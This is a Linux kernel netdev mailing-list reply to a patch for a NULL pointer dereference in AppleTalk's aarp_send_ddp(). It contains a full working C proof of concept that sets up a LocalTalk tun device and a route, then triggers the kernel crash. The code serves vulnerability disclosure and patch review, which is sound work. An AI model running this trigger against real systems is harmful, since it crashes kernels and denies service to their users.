Return-Path: <netdev+bounces-288977-lists+netdev=lfdr.de@vger.kernel.org>
Delivered-To: lists+netdev@lfdr.de
Received: from mail.lfdr.de
	by lfdr with LMTP
	id yE0mLSrjCmo29AQAu9opvQ
	(envelope-from <netdev+bounces-288977-lists+netdev=lfdr.de@vger.kernel.org>)
	for <lists+netdev@lfdr.de>; Mon, 18 May 2026 12:00:10 +0200
X-Original-To: lists+netdev@lfdr.de
Received: from sea.lore.kernel.org (sea.lore.kernel.org [172.234.253.10])
	by mail.lfdr.de (Postfix) with ESMTPS id 1C55A56A354
	for <lists+netdev@lfdr.de>; Mon, 18 May 2026 12:00:09 +0200 (CEST)
Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
	by sea.lore.kernel.org (Postfix) with ESMTP id 5E2A830048E5
	for <lists+netdev@lfdr.de>; Mon, 18 May 2026 09:58:20 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 9D300221723;
	Mon, 18 May 2026 09:58:19 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="Q8iL6DFG"
X-Original-To: netdev@vger.kernel.org
Received: from mail-pl1-f171.google.com (mail-pl1-f171.google.com [209.85.214.171])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 2AF7C3246F0
	for <netdev@vger.kernel.org>; Mon, 18 May 2026 09:58:18 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.214.171
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1779098299; cv=none; b=I8LuJyDo5LrcUbR91xjmBvkxZs0r1rgh0y9VgeNlc7d+bR4pRdgMwySeW+KQQQ+Ui2gn/wbPlWttY7ECkeiM2euVaEUz34rdiIlLrfWto22CIcwDzVij9GO07J4noJapC07fgwGosQJNbZCRZ4M6L8frVxXx11HNJnSmluqruOw=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1779098299; c=relaxed/simple;
	bh=Px3ml6CXKW2HoRvZWhj3dKVzd8FEL471r1+8iaPjZTU=;
	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
	 Content-Type:Content-Disposition:In-Reply-To; b=mOsqPLKpNdPedfy0/vTt6HQiTH8SL05BGp8LyRqioq5sVTzlI1O87MOk0bRj8rDydC08kssjOxLuhigbVJG6tlUyrLKg7RMupRX8XDo4/m/3cjfjb0JvGqKd3OjF45QdSs0l0jJc8Ar0pg80ivlQH8tEtPleRMw0VJLQDtT6jSI=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=Q8iL6DFG; arc=none smtp.client-ip=209.85.214.171
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Received: by mail-pl1-f171.google.com with SMTP id d9443c01a7336-2ba856db1c0so15400275ad.3
        for <netdev@vger.kernel.org>; Mon, 18 May 2026 02:58:18 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1779098297; x=1779703097; darn=vger.kernel.org;
        h=in-reply-to:content-disposition:mime-version:references:message-id
         :subject:cc:to:from:date:from:to:cc:subject:date:message-id:reply-to;
        bh=x5REwqlcziR4FnHt+qeMITmdXsNruZWERVzpHPtPZSo=;
        b=Q8iL6DFGqH+R5Oj6w7j40y07iKISr3Mje3CZQIWuwnApeKAfQL8qO7tNHNP5a5AEz0
         mArS+RXj5om8nqvQxGQVu77n2v3wm0Ms7dMpydE7yzu52GhnKvS8h4ph+rg2t1/z/C8Y
         87WgzO3gYWrFnkiUtO+o2cUXNrPbSSYNWyfCijYgMVyDaHgQIJ7BUZm1C67fRAD937lq
         AzyO7DmaHrSJZiWIqT3TRFNFCQ9hFdMH5gox8WPOXqeptEwplBdJ0vo4Wqrcy09xeRCy
         pwuTFqO4fB5Gq3xFPrNQLfIx1fL9JhijeNdxQnxZPggFFYUTuBhDOSIkued8opCl3q5U
         bO6A==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1779098297; x=1779703097;
        h=in-reply-to:content-disposition:mime-version:references:message-id
         :subject:cc:to:from:date:x-gm-gg:x-gm-message-state:from:to:cc
         :subject:date:message-id:reply-to;
        bh=x5REwqlcziR4FnHt+qeMITmdXsNruZWERVzpHPtPZSo=;
        b=IqalpuB5kfxz5h+I/AOjffYg87JxvXWUnn8J6np270pDMeng8wkdm9RuT6QBlIc4AG
         nw40u+Z/8FewMY1RVtYutk+0FOaUnfYj1icGpY/WN41T/eaBkfOt6o+DvDewKCN1pSkZ
         FEla9XCDfhkQ5cC4C7zOOrMMWiEZO4Xaw3AEP3G8BLOxbCCuWTX5HBD9Usf5SpmpsfnQ
         eeDeZ67Vz8QFazUOMW/sl23ni8AAgbreKkNqPKywcqm6ip3SO4+O1kVMXr2COXyIvF0X
         NahWYwvkv/fIAYLiD0sov7TlgII2V1wGfON/mA0YyHdrVqT6G5P3o9JkMR10UbA9VRnM
         2DFQ==
X-Forwarded-Encrypted: i=1; AFNElJ8XAjZEQ8AkMkXkyJPQnyOygW5wijktZfmLW30cCwO3WoT187B7jtYxhUJiKIofu0glXe2sN3Q=@vger.kernel.org
X-Gm-Message-State: AOJu0YyjViCcgm6kJgbomS/BD2EDjndpSSpseMl59Uku3dYWjFsfJItL
	C0JptBYlPu1lNFGswV1pn6PYfKAOd0oT/hwcM6sSVS/cs7DgcaLJtgii
X-Gm-Gg: Acq92OHYrn4cunuMq6UAMUVTYk7Ri+AB6GJzoBKmMHsF8we8Iss4lH9Ol9WZFqRXBxS
	szl3Bi3GATMvim1s/hasmxA3V+6s4fRejrkRdini8OGffjPPngDliUNIk+A4fnTkjqRq0KVcc5w
	rotxX7YN2mQhF5vgfSTyW1m/IOV3YQyfcRlUr3eDI+FmZut4vX+8TYqT5m1tx8KkH4SdKL/4VaO
	x4Nt+VrWXx85wVcXKq4WMnOsTLt5Env0P3fhAQegcMaN0eCbFgw+llr9lffPjY6pUtFNURGXsxy
	sYgs2qxBFjawmtUUDga4o6z9nhE/c4wsFSwC12S80mket4oHlPpAL95A2iYn0EHW/GYURJ+kHFA
	zG2+OWsypbclcYKY7MlcWL8oozApHTrvQkpAuC+Q6TAPPMvtHBAvskzqlMiS8WUbiwsL/FqXLtU
	3LWhFoW2R+Dx/ETkTNRifnpT1Gd+wuySjUDLd/2lunJFZnIzCbOhakEviBJS7QZA==
X-Received: by 2002:a17:902:a618:b0:2ba:83f8:7b7b with SMTP id d9443c01a7336-2bd7e8bd396mr115727475ad.33.1779098297493;
        Mon, 18 May 2026 02:58:17 -0700 (PDT)
Received: from Air.local ([198.176.50.157])
        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2bd5bd5f291sm148412425ad.15.2026.05.18.02.58.14
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Mon, 18 May 2026 02:58:16 -0700 (PDT)
Date: Mon, 18 May 2026 17:58:11 +0800
From: Weiming Shi <bestswngs@gmail.com>
To: "David S . Miller" <davem@davemloft.net>, 
	Eric Dumazet <edumazet@google.com>, Jakub Kicinski <kuba@kernel.org>, 
	Paolo Abeni <pabeni@redhat.com>
Cc: Simon Horman <horms@kernel.org>, Kees Cook <kees@kernel.org>, 
	netdev@vger.kernel.org, Xiang Mei <xmei5@asu.edu>
Subject: Re: [PATCH net] net: appletalk: fix NULL pointer dereference in
 aarp_send_ddp()
Message-ID: <agrhj31N6K0ncmOr@Air.local>
References: <20260514123806.3085961-3-bestswngs@gmail.com>
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
In-Reply-To: <20260514123806.3085961-3-bestswngs@gmail.com>
X-Rspamd-Queue-Id: 1C55A56A354
X-Rspamd-Server: lfdr
X-Spamd-Result: default: False [-2.16 / 15.00];
	ARC_ALLOW(-1.00)[subspace.kernel.org:s=arc-20240116:i=1];
	DMARC_POLICY_ALLOW(-0.50)[gmail.com,none];
	R_SPF_ALLOW(-0.20)[+ip4:172.234.253.10:c];
	R_DKIM_ALLOW(-0.20)[gmail.com:s=20251104];
	MAILLIST(-0.15)[generic];
	MIME_GOOD(-0.10)[text/plain];
	HAS_LIST_UNSUB(-0.01)[];
	DKIM_TRACE(0.00)[gmail.com:+];
	TO_DN_SOME(0.00)[];
	MIME_TRACE(0.00)[0:+];
	TAGGED_FROM(0.00)[bounces-288977-lists,netdev=lfdr.de];
	RCVD_TLS_LAST(0.00)[];
	FORGED_SENDER_MAILLIST(0.00)[];
	FORGED_RECIPIENTS_MAILLIST(0.00)[];
	MISSING_XM_UA(0.00)[];
	FROM_HAS_DN(0.00)[];
	FREEMAIL_FROM(0.00)[gmail.com];
	RCVD_COUNT_FIVE(0.00)[5];
	PRECEDENCE_BULK(0.00)[];
	FROM_NEQ_ENVFROM(0.00)[bestswngs@gmail.com,netdev@vger.kernel.org];
	ASN(0.00)[asn:63949, ipnet:172.234.224.0/19, country:SG];
	NEURAL_HAM(-0.00)[-0.999];
	TAGGED_RCPT(0.00)[netdev];
	RCPT_COUNT_SEVEN(0.00)[8];
	RCVD_VIA_SMTP_AUTH(0.00)[];
	DBL_BLOCKED_OPENRESOLVER(0.00)[sea.lore.kernel.org:helo,sea.lore.kernel.org:rdns,Air.local:mid]
X-Rspamd-Action: no action

Required key configs for the poc:

CONFIG_ATALK=y

and need CAP_NET_ADMIN permissions to run the poc.

```
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <linux/if.h>
#include <linux/if_tun.h>
#include <linux/if_arp.h>
#include <linux/route.h>
#include <linux/sockios.h>

#ifndef AF_APPLETALK
#define AF_APPLETALK 5
#endif
#ifndef PF_APPLETALK
#define PF_APPLETALK AF_APPLETALK
#endif

struct sockaddr_at {
    unsigned short sat_family;
    unsigned char sat_port;
    struct {
        unsigned short s_net;
        unsigned char s_node;
    } sat_addr;
    char sat_zero[8];
};

struct atalk_netrange_layout {
    unsigned char nr_phase;
    unsigned short nr_firstnet;
    unsigned short nr_lastnet;
};

static int tun_alloc(char *dev_name)
{
    int fd = open("/dev/net/tun", O_RDWR);
    if (fd < 0) {
        perror("open /dev/net/tun");
        return -1;
    }
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    ifr.ifr_flags = IFF_TUN | IFF_NO_PI;
    strncpy(ifr.ifr_name, dev_name, IFNAMSIZ - 1);

    if (ioctl(fd, TUNSETIFF, &ifr) < 0) {
        perror("TUNSETIFF");
        close(fd);
        return -1;
    }
    if (ioctl(fd, TUNSETPERSIST, 1) < 0)
        perror("TUNSETPERSIST");

    if (ioctl(fd, TUNSETLINK, (unsigned long)ARPHRD_LOCALTLK) < 0) {
        perror("TUNSETLINK ARPHRD_LOCALTLK");
        close(fd);
        return -1;
    }
    return fd;
}

int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    printf("[+] PoC for aarp_send_ddp() NULL deref (LocalTalk path)\n");

    int tunfd = tun_alloc("ltalk0");
    if (tunfd < 0)
        return 1;
    printf("[+] tun device 'ltalk0' created with type ARPHRD_LOCALTLK (773)\n");

    int atsock = socket(PF_APPLETALK, SOCK_DGRAM, 0);
    if (atsock < 0) {
        perror("socket(AF_APPLETALK)");
        return 1;
    }
    printf("[+] AF_APPLETALK socket created (fd=%d)\n", atsock);

    int ctlsock = socket(AF_INET, SOCK_DGRAM, 0);
    if (ctlsock < 0) {
        perror("socket(AF_INET)");
        return 1;
    }

    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, "lo", IFNAMSIZ - 1);
    ioctl(ctlsock, SIOCGIFFLAGS, &ifr);
    ifr.ifr_flags |= IFF_UP | IFF_RUNNING;
    ioctl(ctlsock, SIOCSIFFLAGS, &ifr);

    {
        struct ifreq ifr2;
        memset(&ifr2, 0, sizeof(ifr2));
        strncpy(ifr2.ifr_name, "lo", IFNAMSIZ - 1);
        struct sockaddr_at *sat = (struct sockaddr_at *)&ifr2.ifr_addr;
        sat->sat_family = AF_APPLETALK;
        sat->sat_addr.s_net = htons(0x1234);
        sat->sat_addr.s_node = 1;
        struct atalk_netrange_layout *nr =
            (struct atalk_netrange_layout *)&sat->sat_zero[0];
        nr->nr_phase = 2;
        nr->nr_firstnet = htons(0x1234);
        nr->nr_lastnet = htons(0x1234);

        if (ioctl(atsock, SIOCSIFADDR, &ifr2) < 0)
            perror("SIOCSIFADDR lo");
        else
            printf("[+] AppleTalk address configured on lo (net=0x1234, node=1)\n");
    }

    {
        struct rtentry rt;
        memset(&rt, 0, sizeof(rt));
        struct sockaddr_at *dst = (struct sockaddr_at *)&rt.rt_dst;
        struct sockaddr_at *gw  = (struct sockaddr_at *)&rt.rt_gateway;
        dst->sat_family = AF_APPLETALK;
        dst->sat_addr.s_net = htons(0x4321);
        dst->sat_addr.s_node = 0;
        gw->sat_family = AF_APPLETALK;
        gw->sat_addr.s_net = htons(0x4321);
        gw->sat_addr.s_node = 1;
        rt.rt_flags = RTF_UP;
        rt.rt_dev = "ltalk0";

        if (ioctl(atsock, SIOCADDRT, &rt) < 0) {
            perror("SIOCADDRT (ltalk0 route)");
            return 1;
        }
        printf("[+] route added: 0x4321/0 -> dev ltalk0 (atalk_ptr is NULL!)\n");
    }

    struct sockaddr_at dest;
    memset(&dest, 0, sizeof(dest));
    dest.sat_family = AF_APPLETALK;
    dest.sat_port = 1;
    dest.sat_addr.s_net = htons(0x4321);
    dest.sat_addr.s_node = 1;

    char payload[16];
    memset(payload, 'A', sizeof(payload));

    printf("[*] sendto -> network 0x4321 / node 1 (expect NULL deref now)\n");
    ssize_t n = sendto(atsock, payload, sizeof(payload), 0,
                       (struct sockaddr *)&dest, sizeof(dest));
    printf("[*] sendto returned %zd (errno=%d %s)\n", n, errno, strerror(errno));

    return 0;
}

```

